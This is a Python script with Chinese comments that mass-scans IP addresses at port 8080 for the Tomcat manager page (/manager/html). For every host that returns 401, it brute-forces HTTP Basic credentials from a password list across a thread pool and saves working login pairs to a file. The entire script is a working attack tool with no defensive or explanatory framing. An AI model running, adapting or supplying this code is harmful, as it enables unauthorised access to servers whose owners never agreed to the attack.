import requests
from concurrent.futures import ThreadPoolExecutor,as_completed,wait
import base64

### 按行读取指定文件内容并返回
def file_read(for_read_file):
    file=open(for_read_file,'r',encoding='utf-8')
    file_list=file.readlines()
    file.close()
    return file_list

#给指定文件写入指定数据
def file_Write(for_write_file,data):
    file=open(for_write_file,'a+',encoding="utf-8")
    for i in data:
        file.write(i)
        file.flush()


###将ip加上指定端口并写入指定文件
def to_Port(for_write_file,for_port,data):
    file = open(for_write_file, 'a+', encoding='utf-8')
    for i in data:
        i = i.strip('\n')   #去掉换行符
        i = i + ":"+for_port
        print("正在写入:" +i)
        file.write(i + '\n')
        file.flush()



#验证url是否可以访问，如果可以，填入指定文件
def url_canPost(url):
    # 判断页面是否可以访问
    passwd=file_read('passwd.txt')
    try:
        r = requests.get(url,timeout=5)
        r_status_Code=r.status_code
        if r_status_Code == 401:
            file_Write('ip_userless.txt', url + '\n')
            for authorization in passwd:
                header = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                    'Accept-Encoding': 'gzip, deflate',
                    'DNT': '1',
                    'Connection': 'close',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'max-age=0',
                    'Authorization': "basic " + str(base64.b64encode(authorization.encode('utf-8')), 'utf-8')
                }
                try:
                    r2 = requests.get(url, headers=header, timeout=5)
                    r2_status_Code = r2.status_code
                    if r2_status_Code == 200:
                        pwd = url + "  " + authorization
                        return pwd
                    else:
                        pass
                except Exception as e:
                    pass
        else:
            print(url + ':请求失败!')
    except Exception as e:
        pass
def main():
    # ip_list=file_read('ScannedIPs.txt')  #当要读取ip时调用
    # print("数据读取完毕！")
    # to_Port('toScanIp.txt','8080/manager/html',ip_list)    #当要给ip加上端口且写入文件时调用
    # print("数据转换完毕！")
    ############################
    ip_Port=file_read('toScanIp.txt') #读取vn_toScanIp.txt信息
    ip_arr=[]
    for url in ip_Port:
        url = url.strip("\n")
        print("正在请求:" + url)
        url = "http://" + str(url)
        executor = ThreadPoolExecutor(max_workers=5)
        task=executor.submit(url_canPost,url)
        ip_arr.append(task)
    for ip_sucessful in as_completed(ip_arr):
        if ip_sucessful.result()!=None:
            ip_sucess=ip_sucessful.result()
            file_Write('ip_userful.txt',ip_sucess)
if __name__ == '__main__':
    main()
